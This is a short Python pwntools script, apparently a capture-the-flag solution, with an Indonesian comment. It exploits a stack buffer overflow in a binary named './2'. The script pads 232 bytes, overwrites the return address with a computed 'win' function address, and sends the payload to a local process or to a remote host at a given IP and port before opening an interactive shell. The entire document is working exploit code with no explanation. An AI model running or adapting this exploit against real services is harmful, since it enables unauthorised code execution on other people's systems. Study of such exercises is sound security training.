from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug('./2', 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process('./2')

def solve(): 
    p = conn()
    
    if(args.REMOTE):
        p.sendline("13523032")
        p.sendline("2")

    # write your payload here
    padding = b'A' * (224+8)
    offset_win = -0x1a
    vuln_addr = 0x401406
    win_addr = vuln_addr + offset_win
    payload = padding + p64(win_addr)
    print(payload)

    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()